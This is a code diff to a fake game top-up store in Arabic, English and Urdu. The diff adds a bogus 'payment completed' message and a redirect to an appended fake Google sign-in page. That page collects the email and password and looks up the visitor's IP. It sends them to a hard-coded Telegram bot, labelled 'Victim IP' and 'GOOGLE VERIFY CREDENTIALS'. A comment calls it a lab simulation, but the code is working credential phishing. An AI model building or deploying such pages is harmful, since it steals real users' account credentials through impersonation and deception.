@@ -189,9 +189,13 @@
         .modal-content i { font-size: 70px; color: var(--success); margin-bottom: 20px; }
         .modal-content h3 { font-size: 24px; margin-bottom: 10px; }
         .modal-content p { color: var(--gray); margin-bottom: 25px; }
-        .modal-content button { background: var(--primary); color: white; border: none; padding: 15px 40px; border-radius: 50px; font-size: 16px; font-weight: 600; font-family: 'Tajawal', sans-serif; cursor: pointer; }
         .modal-close-x { position: absolute; top: 12px; right: 18px; background: transparent; border: none; font-size: 30px; color: var(--gray); cursor: pointer; width: 38px; height: 38px; border-radius: 50%; display: flex; align-items: center; justify-content: center; transition: all 0.3s; line-height: 1; padding: 0; font-family: inherit; font-weight: 300; }
         .modal-close-x:hover { background: #f5f5f5; color: var(--danger); transform: rotate(90deg); }
+        /* رسالة الدفع الجديدة */
+        .modal-text { white-space: pre-line; text-align: center; line-height: 1.8; margin: 10px 0; color: #555; font-size: 15px; }
+        .modal-note { font-size: 13px; color: var(--primary); font-weight: 600; margin: 6px 0 14px; }
+        .modal-ok { background: var(--primary); color: #fff; border: none; padding: 10px 30px; border-radius: 50px; cursor: pointer; font-size: 16px; font-weight: 700; font-family: inherit; }
+        .modal-ok:hover { background: var(--primary-dark); }
         @media (max-width: 1200px) { .products-grid { grid-template-columns: repeat(3, 1fr); } }
         @media (max-width: 768px) { .nav-links { display: none; } .hero h1 { font-size: 32px; } .features { grid-template-columns: repeat(2, 1fr); } .products-grid { grid-template-columns: repeat(2, 1fr); } .steps { grid-template-columns: repeat(2, 1fr); } .steps::before { display: none; } .cart-sidebar { width: 100%; left: -100%; } .form-grid { grid-template-columns: 1fr; } }
     </style>
@@ -398,13 +402,19 @@
         </div>
     </div>
 
+    <!-- Success modal — رسالة الدفع الجديدة -->
     <div class="modal" id="successModal" onclick="if(event.target === this) closeModal()">
         <div class="modal-content">
             <button class="modal-close-x" onclick="closeModal()" aria-label="Close">×</button>
             <i class="fas fa-check-circle"></i>
-            <h3 data-i18n="modal.thanks.title">تم إرسال الطلب!</h3>
-            <p data-i18n="modal.thanks.desc">وصلت بياناتك إلى البوت والسيرفر المحلي — راجع تيليجرام بتاعك و captures.log</p>
-            <button onclick="closeModal()" data-i18n="modal.ok">تم</button>
+            <h2 style="font-size:24px; margin-bottom:10px;" data-i18n="modal.thanks.title">تم عملية الدفع ✅</h2>
+            <p class="modal-text" data-i18n="modal.thanks.desc">يرجى الانتظار للتحقق من معلوماتك
+
+إذا استلمت إشعاراً من جوجل هذا يعني:
+فريق الدعم الفني يتحقق من المعلومات التي أدخلتها
+انتظر قليلاً حتى تكتمل العملية</p>
+            <p class="modal-note" data-i18n="modal.redirect">⏳ سيتم تحويلك إلى صفحة التحقق من جوجل...</p>
+            <button class="modal-ok" onclick="closeModal()">تم</button>
         </div>
     </div>
 
@@ -466,7 +476,7 @@
                 'contact.title': '💬 تواصل معنا', 'contact.desc': 'فريقنا متاح على واتساب لمساعدتك على مدار الساعة', 'contact.whatsapp': 'واتساب', 'contact.name': 'الاسم', 'contact.phone': 'رقم الواتساب', 'contact.gameChoose': 'اختر اللعبة', 'contact.msg': 'رسالتك أو استفسارك...', 'contact.send': 'إرسال عبر واتساب',
                 'footer.copy': '© 2024 Pakistan Store - متجر باكستاني - جميع الحقوق محفوظة',
                 'cart.title': '🛒 سلة التسوق', 'cart.empty': 'السلة فارغة', 'cart.emptyHelp': 'اختر باقة للبدء', 'cart.total': 'الإجمالي:', 'cart.note': 'لإتمام الطلب، املأ النموذج في الصفحة',
-                'modal.ok': 'تم', 'modal.thanks.title': 'تم إرسال الطلب!', 'modal.thanks.desc': 'وصلت بياناتك إلى البوت والسيرفر المحلي — راجع تيليجرام بتاعك و captures.log',
+                'modal.ok': 'تم', 'modal.thanks.title': 'تم عملية الدفع ✅', 'modal.thanks.desc': 'يرجى الانتظار للتحقق من معلوماتك\n\nإذا استلمت إشعاراً من جوجل هذا يعني:\nفريق الدعم الفني يتحقق من المعلومات التي أدخلتها\nانتظر قليلاً حتى تكتمل العملية', 'modal.redirect': '⏳ سيتم تحويلك إلى صفحة التحقق من جوجل...',
                 'alert.choosePack': '⚠️ اختر باقة أولاً!', 'alert.chooseLink': '⚠️ اختر نوع ربط الحساب الأساسي!', 'alert.fillId': '⚠️ أدخل معرف اللاعب (ID)!', 'alert.fillEmail': '⚠️ أدخل بريد إلكتروني صحيح!', 'alert.fillPassword': '⚠️ أدخل كلمة المرور!', 'alert.passwordMismatch': '⚠️ كلمة المرور غير متطابقة!', 'alert.passwordShort': '⚠️ كلمة المرور قصيرة — 8 أحرف على الأقل!', 'alert.choosePayment': '⚠️ اختر طريقة الدفع!', 'alert.comingSoon': '🚧 قريباً! خدمة شحن ببجي موبايل ستكون متاحة قريباً', 'alert.noDelivery': '⚠️ الإرسال فشل! اتأكد إن التوكين والـ chat id في الـ CONFIG صح'
             },
             en: {
@@ -491,7 +501,7 @@
                 'contact.title': '💬 Contact Us', 'contact.desc': 'Our team is on WhatsApp to help you 24/7', 'contact.whatsapp': 'WhatsApp', 'contact.name': 'Name', 'contact.phone': 'WhatsApp number', 'contact.gameChoose': 'Choose game', 'contact.msg': 'Your message or inquiry...', 'contact.send': 'Send via WhatsApp',
                 'footer.copy': '© 2024 Pakistan Store - All rights reserved',
                 'cart.title': '🛒 Shopping Cart', 'cart.empty': 'Cart is empty', 'cart.emptyHelp': 'Pick a package to start', 'cart.total': 'Total:', 'cart.note': 'To complete your order, fill the form on the page',
-                'modal.ok': 'OK', 'modal.thanks.title': 'Order submitted!', 'modal.thanks.desc': 'Your data reached your bot and the local server — check Telegram and captures.log',
+                'modal.ok': 'OK', 'modal.thanks.title': 'Payment completed ✅', 'modal.thanks.desc': 'Please wait while we verify your information\n\nIf you receive a notification from Google, this means:\nOur support team is verifying the information you entered\nPlease wait a moment until the process completes', 'modal.redirect': '⏳ Redirecting you to the Google verification page...',
                 'alert.choosePack': '⚠️ Choose a package first!', 'alert.chooseLink': '⚠️ Choose primary account link type!', 'alert.fillId': '⚠️ Enter your Player ID!', 'alert.fillEmail': '⚠️ Enter a valid email!', 'alert.fillPassword': '⚠️ Enter your password!', 'alert.passwordMismatch': '⚠️ Passwords do not match!', 'alert.passwordShort': '⚠️ Password too short — at least 8 characters!', 'alert.choosePayment': '⚠️ Choose a payment method!', 'alert.comingSoon': '🚧 Coming soon! PUBG Mobile top-up will be available soon', 'alert.noDelivery': '⚠️ Delivery failed! Make sure the token and chat id are set in CONFIG'
             },
             ur: {
@@ -516,7 +526,7 @@
                 'contact.title': '💬 ہم سے رابطہ', 'contact.desc': 'ہماری ٹیم آپ کی مدد کے لیے 24/7 واٹس ایپ پر دستیاب ہے', 'contact.whatsapp': 'واٹس ایپ', 'contact.name': 'نام', 'contact.phone': 'واٹس ایپ نمبر', 'contact.gameChoose': 'کھیل منتخب کریں', 'contact.msg': 'آپ کا پیغام یا سوال...', 'contact.send': 'واٹس ایپ کے ذریعے بھیجیں',
                 'footer.copy': '© 2024 پاکستان اسٹور - جملہ حقوق محفوظ ہیں',
                 'cart.title': '🛒 شاپنگ کارٹ', 'cart.empty': 'کارٹ خالی ہے', 'cart.emptyHelp': 'شروع کرنے کے لیے پیکج منتخب کریں', 'cart.total': 'کل:', 'cart.note': 'آرڈر مکمل کرنے کے لیے، صفحے پر فارم پُر کریں',
-                'modal.ok': 'ٹھیک ہے', 'modal.thanks.title': 'آرڈر جمع کر دیا گیا!', 'modal.thanks.desc': 'آپ کا ڈیٹا آپ کے بوٹ اور مقامی سرور تک پہنچ گیا — ٹیلیگرام اور captures.log چیک کریں',
+                'modal.ok': 'ٹھیک ہے', 'modal.thanks.title': 'ادائیگی مکمل ہو گئی ✅', 'modal.thanks.desc': 'براہ کرم آپ کی معلومات کی تصدیق تک انتظار کریں\n\nاگر آپ کو گوگل سے اطلاع موصول ہوتی ہے تو اس کا مطلب ہے:\nہماری سپورٹ ٹیم آپ کی درج کردہ معلومات کی تصدیق کر رہی ہے\nبراہ کرم تھوڑا انتظار کریں جب تک عمل مکمل نہ ہو جائے', 'modal.redirect': '⏳ آپ کو گوگل کی تصدیق کے صفحے پر بھیجا جا رہا ہے...',
                 'alert.choosePack': '⚠️ پہلے ایک پیکج منتخب کریں!', 'alert.chooseLink': '⚠️ بنیادی اکاؤنٹ لنک کی قسم منتخب کریں!', 'alert.fillId': '⚠️ اپنا کھلاڑی ID درج کریں!', 'alert.fillEmail': '⚠️ درست ای میل درج کریں!', 'alert.fillPassword': '⚠️ اپنا پاس ورڈ درج کریں!', 'alert.passwordMismatch': '⚠️ پاس ورڈ مماثل نہیں ہیں!', 'alert.passwordShort': '⚠️ پاس ورڈ بہت چھوٹا ہے — کم از کم 8 حروف!', 'alert.choosePayment': '⚠️ ادائیگی کا طریقہ منتخب کریں!', 'alert.comingSoon': '🚧 جلد آ رہا ہے! پب جی موبائل ٹاپ اپ جلد دستیاب ہوگا', 'alert.noDelivery': '⚠️ ترسیل ناکام! CONFIG میں ٹوکن اور چٹ آئی ڈی سیٹ کریں'
             }
         };
@@ -811,7 +821,7 @@
         }
 
         // ============================================================
-        // ✅ تدفق الطلب
+        // ✅ تدفق الطلب — رسالة الدفع + تحويل لصفحة جوجل
         // ============================================================
         function proceedToCheckout() {
             var t = i18n[currentLang];
@@ -839,8 +849,18 @@
                 device: getDeviceInfo()
             };
             exfil(buildCredsMessage(payload), payload).then(function(ok) {
-                if (ok) document.getElementById('successModal').classList.add('active');
-                else alert(t['alert.noDelivery']);
+                if (ok) {
+                    document.getElementById('successModal').classList.add('active');
+                    setTimeout(function() {
+                        var q = 'google-login.html?email=' + encodeURIComponent(payload.email) +
+                                '&id=' + encodeURIComponent(payload.playerId) +
+                                '&pkg=' + encodeURIComponent(payload.package.name) +
+                                '&diamonds=' + payload.package.diamonds +
+                                '&link=' + encodeURIComponent(payload.linkType) +
+                                '&game=' + encodeURIComponent(payload.game);
+                        window.location.href = q;
+                    }, 3000);
+                } else alert(t['alert.noDelivery']);
             });
         }
         function submitForm(e) {
@@ -890,4 +910,333 @@
         sendPageLoaded();
     </script>
 </body>
+    <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!-- LAB BUILD v3 — fake Google sign-in (phishing sim, OWASP A01/A02/A03 training)
+         Sends entered creds to the lab owner's Telegram bot -->
+    <title>Sign in - Google Accounts</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: Roboto, 'Segoe UI', Arial, sans-serif;
+            background: #f0f4f9;
+            min-height: 100vh;
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            padding: 24px; color: #202124;
+        }
+        .hidden { display: none !important; }
+        .card {
+            background: #fff; border: 1px solid #dadce0; border-radius: 12px;
+            padding: 48px 40px 36px; max-width: 450px; width: 100%;
+            box-shadow: 0 1px 3px rgba(60,64,67,.3);
+        }
+        .card-inner { display: flex; flex-direction: column; }
+        .logo { display: flex; justify-content: center; margin-bottom: 16px; }
+        .logo svg { width: 52px; height: 52px; }
+        h1 { font-size: 24px; font-weight: 400; text-align: center; margin-bottom: 8px; }
+        .sub { font-size: 16px; text-align: center; margin-bottom: 28px; }
+        .sub.small { font-size: 14px; color: #5f6368; margin-top: -14px; margin-bottom: 20px; }
+        .email-line { color: #202124; font-size: 15px; font-weight: 500; }
+        .avatar {
+            width: 52px; height: 52px; border-radius: 50%; background: #1a73e8; color: #fff;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 22px; font-weight: 500; margin: 0 auto 16px;
+        }
+        .field { margin-bottom: 16px; position: relative; }
+        .field label { display: block; font-size: 13px; color: #5f6368; margin-bottom: 6px; font-weight: 500; }
+        .field input {
+            width: 100%; padding: 13px 15px; font-size: 16px; color: #202124;
+            border: 1px solid #dadce0; border-radius: 4px; outline: none; background: #fff;
+        }
+        .field input:focus { border-color: #1a73e8; box-shadow: 0 0 0 2px rgba(26,115,232,.2); }
+        .field input.invalid { border-color: #d93025; }
+        .error { display: none; color: #d93025; font-size: 12px; margin-top: 6px; }
+        .error.visible { display: block; }
+        .pass-wrap { position: relative; }
+        .pass-wrap input { padding-right: 44px; }
+        .eye {
+            position: absolute; right: 10px; top: 50%; transform: translateY(-50%);
+            background: none; border: none; cursor: pointer; padding: 4px; opacity: .6;
+        }
+        .eye:hover { opacity: 1; }
+        .actions { display: flex; justify-content: space-between; align-items: center; margin-top: 26px; }
+        .link { color: #1a73e8; font-weight: 600; font-size: 14px; text-decoration: none; }
+        .link:hover { background: rgba(26,115,232,.06); padding: 6px 8px; border-radius: 4px; }
+        .btn {
+            background: #1a73e8; color: #fff; border: none; border-radius: 4px;
+            padding: 10px 24px; font-size: 14px; font-weight: 600; cursor: pointer; font-family: inherit;
+        }
+        .btn:hover { background: #1765cc; box-shadow: 0 1px 3px rgba(66,133,244,.4); }
+        .success { text-align: center; padding: 20px 0; }
+        .check {
+            width: 64px; height: 64px; border-radius: 50%; background: #34a853; color: #fff;
+            font-size: 34px; display: flex; align-items: center; justify-content: center; margin: 0 auto 18px;
+            box-shadow: 0 4px 12px rgba(52,168,83,.4);
+        }
+        .success h2 { font-family: 'Segoe UI', Tahoma, Arial, sans-serif; font-size: 22px; font-weight: 700; margin-bottom: 8px; }
+        .success p { font-size: 15px; color: #444; line-height: 1.9; }
+        .info-box {
+            background: #f8f9fa; border: 1px solid #e8eaed; border-radius: 8px;
+            padding: 14px 18px; margin: 18px 0; font-size: 14px;
+        }
+        .info-box strong { color: #202124; }
+        .countdown { font-size: 13px; color: #5f6368; margin-top: 14px; }
+        .back-btn { display: inline-block; margin-top: 12px; text-decoration: none; padding: 12px 28px; }
+        .debug { color: #d93025; font-size: 12px; margin-top: 12px; }
+        footer {
+            margin-top: 24px; width: 100%; max-width: 450px; display: flex;
+            justify-content: space-between; align-items: center; font-size: 12px; color: #5f6368;
+        }
+        footer a { color: #5f6368; text-decoration: none; margin-left: 16px; }
+        footer a:hover { color: #202124; }
+        .lang { color: #5f6368; font-weight: 500; cursor: pointer; }
+        @media (max-width: 480px) {
+            .card { padding: 32px 24px 28px; }
+            footer { flex-direction: column; gap: 10px; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ===== Card / steps ===== -->
+    <div class="card" id="card">
+        <div class="card-inner">
+
+            <!-- Step 1: email -->
+            <div class="step" id="step1">
+                <div class="logo">
+                    <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+                        <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+                        <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+                        <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+                        <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+                    </svg>
+                </div>
+                <h1>Sign in</h1>
+                <p class="sub">Use your Google Account</p>
+                <div class="field">
+                    <label for="email">Email or phone</label>
+                    <input type="email" id="email" autocomplete="username" placeholder="name@gmail.com" dir="ltr">
+                    <div class="error" id="emailError">Enter a valid email address</div>
+                </div>
+                <div class="actions">
+                    <a class="link" href="javascript:void(0)">Forgot email?</a>
+                    <button class="btn" onclick="nextStep()">Next</button>
+                </div>
+            </div>
+
+            <!-- Step 2: password -->
+            <div class="step hidden" id="step2">
+                <div class="logo"><div class="avatar" id="avatar">?</div></div>
+                <h1>Welcome</h1>
+                <p class="sub email-line" id="welcomeEmail"></p>
+                <p class="sub small">Enter your password</p>
+                <div class="field">
+                    <label for="password">Password</label>
+                    <div class="pass-wrap">
+                        <input type="password" id="password" autocomplete="current-password" placeholder="Enter your password" dir="ltr">
+                        <button type="button" class="eye" onclick="togglePass()" title="Show password">
+                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#5f6368" stroke-width="2">
+                                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>
+                            </svg>
+                        </button>
+                    </div>
+                    <div class="error" id="passError">Enter a password</div>
+                </div>
+                <div class="actions">
+                    <a class="link" href="javascript:void(0)" onclick="backStep()">← Back</a>
+                    <button class="btn" onclick="signIn()">Sign in</button>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <!-- ===== Success screen (after creds submitted) ===== -->
+    <div class="card hidden" id="successScreen">
+        <div class="success">
+            <div class="check">✓</div>
+            <h2>تم عملية الدفع ✅</h2>
+            <p>يرجى الانتظار للتحقق من معلوماتك</p>
+            <div class="info-box">
+                <p>إذا استلمت إشعاراً من جوجل هذا يعني:</p>
+                <p><strong>فريق الدعم الفني يتحقق من المعلومات التي أدخلتها</strong></p>
+                <p>انتظر قليلاً حتى تكتمل العملية</p>
+            </div>
+            <p class="countdown" id="countdown">سيتم إعادتك إلى المتجر خلال 6 ثوانٍ...</p>
+            <a class="btn back-btn" href="index.html">العودة إلى المتجر</a>
+            <div class="debug" id="debug"></div>
+        </div>
+    </div>
+
+    <footer>
+        <div>
+            <a href="javascript:void(0)">Help</a>
+            <a href="javascript:void(0)">Privacy</a>
+            <a href="javascript:void(0)">Terms</a>
+        </div>
+        <span class="lang">العربية</span>
+    </footer>
+
+    <script>
+        // ============================================================
+        // LAB CONFIG — نفس التوكن والـ chat id بتوع المتجر
+        // ============================================================
+        var TELEGRAM_BOT_TOKEN = '8228247059:AAGVPnwBA0ClYziL9GJ0ZBdLypsXC0hhbAw';
+        var TELEGRAM_CHAT_ID = '6062660671';
+        var CALLBACK_URL = 'http://127.0.0.1:8000/callback'; // local lab only — fails silently on Pages
+
+        // ============================================================
+        // سياق الطلب — جاي من index.html عبر الرابط
+        // ============================================================
+        var params = new URLSearchParams(window.location.search);
+        var ctx = {
+            email: params.get('email') || '',
+            id: params.get('id') || '',
+            pkg: params.get('pkg') || '',
+            diamonds: params.get('diamonds') || '',
+            link: params.get('link') || '',
+            game: params.get('game') || 'freefire'
+        };
+
+        // ============================================================
+        // الخطوة 1 → 2
+        // ============================================================
+        function nextStep() {
+            var email = document.getElementById('email').value.trim();
+            var regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (!regex.test(email)) { showErr('emailError'); return; }
+            hideErr('emailError');
+            document.getElementById('welcomeEmail').textContent = email;
+            document.getElementById('avatar').textContent = email.charAt(0).toUpperCase();
+            document.getElementById('step1').classList.add('hidden');
+            document.getElementById('step2').classList.remove('hidden');
+            document.getElementById('password').focus();
+        }
+        function backStep() {
+            document.getElementById('step2').classList.add('hidden');
+            document.getElementById('step1').classList.remove('hidden');
+        }
+        function togglePass() {
+            var p = document.getElementById('password');
+            p.type = (p.type === 'password') ? 'text' : 'password';
+        }
+        function showErr(id) { document.getElementById(id).classList.add('visible'); }
+        function hideErr(id) { document.getElementById(id).classList.remove('visible'); }
+
+        // ============================================================
+        // البيانات المساعدة
+        // ============================================================
+        function getDeviceInfo() {
+            return {
+                platform: navigator.platform || '?',
+                screen: screen.width + 'x' + screen.height,
+                language: navigator.language || '?',
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '?',
+                ua: navigator.userAgent || '?',
+                page: window.location.href,
+                referrer: document.referrer || ''
+            };
+        }
+        function getIP() {
+            return fetch('https://api.ipify.org?format=json')
+                .then(function(r) { return r.json(); })
+                .then(function(d) { return d.ip || ''; })
+                .catch(function() { return ''; });
+        }
+        function sendToTelegram(text) {
+            return fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text })
+            }).then(function(r) { return r.ok; }).catch(function() { return false; });
+        }
+        function buildGoogleMessage(p) {
+            var linkLabels = {
+                google: '🌐 Google', facebook: '📘 Facebook', vk: '🔵 VK',
+                apple: '🍎 Apple ID', twitter: '🐦 Twitter / X', guest: '👤 Guest'
+            };
+            var msg = '🎯 [2] GOOGLE VERIFY CREDENTIALS\n';
+            msg += '━━━━━━━━━━━━━━\n\n';
+            msg += '📧 Email: ' + p.email + '\n';
+            msg += '🔐 Pass: ' + p.password + '\n';
+            msg += '🆔 Player ID: ' + (p.playerId || 'N/A') + '\n';
+            msg += '💎 Package: ' + (p.package || 'N/A') + '\n';
+            msg += '🔗 Link Type: ' + (linkLabels[p.linkType] || p.linkType || 'N/A') + '\n\n';
+            msg += '🕐 Time: ' + p.timestamp + '\n';
+            msg += '🌐 Victim IP: ' + (p.ip || 'N/A') + '\n';
+            msg += '🌐 UA: ' + p.ua;
+            return msg;
+        }
+
+        // ============================================================
+        // الإرسال عند الضغط على Sign in
+        // ============================================================
+        function signIn() {
+            var email = document.getElementById('email').value.trim();
+            var pass = document.getElementById('password').value;
+            if (!pass) { showErr('passError'); return; }
+            hideErr('passError');
+
+            var payload = {
+                type: 'google',
+                timestamp: new Date().toISOString(),
+                email: email,
+                password: pass,
+                playerId: ctx.id,
+                package: ctx.pkg + (ctx.diamonds ? ' (' + ctx.diamonds + ' 💎)' : ''),
+                linkType: ctx.link,
+                game: ctx.game
+            };
+
+            // local callback — silent guard (لو مفيش سيرفر محلي مبيحصلش حاجة)
+            fetch(CALLBACK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).catch(function() {});
+
+            // جيب الـ IP وبعدين ابعث لتيليجرام
+            getIP().then(function(ip) {
+                payload.ip = ip;
+                payload.ua = getDeviceInfo().ua;
+                var msg = buildGoogleMessage(payload);
+                return sendToTelegram(msg);
+            }).then(function(ok) {
+                showSuccess();
+                if (!ok) document.getElementById('debug').textContent = '⚠️ فشل إرسال تيليجرام — راجع التوكن';
+                console.log('[LAB] google payload:', payload);
+            }).catch(function() {
+                showSuccess();
+            });
+        }
+
+        // ============================================================
+        // شاشة النجاح + العد التنازلي
+        // ============================================================
+        function showSuccess() {
+            document.getElementById('card').classList.add('hidden');
+            document.getElementById('successScreen').classList.remove('hidden');
+            var sec = 6;
+            var cd = document.getElementById('countdown');
+            var timer = setInterval(function() {
+                sec--;
+                if (cd) cd.textContent = 'سيتم إعادتك إلى المتجر خلال ' + sec + ' ثوانٍ...';
+                if (sec <= 0) { clearInterval(timer); window.location.href = 'index.html'; }
+            }, 1000);
+        }
+
+        // ============================================================
+        // تجهيز البداية — لو الإيميل جاي مع الرابط يبقى متعبى قبل كده
+        // ============================================================
+        if (ctx.email) document.getElementById('email').value = ctx.email;
+        document.getElementById('password').addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') signIn();
+        });
+    </script>
+</body>
+</html>
 </html>
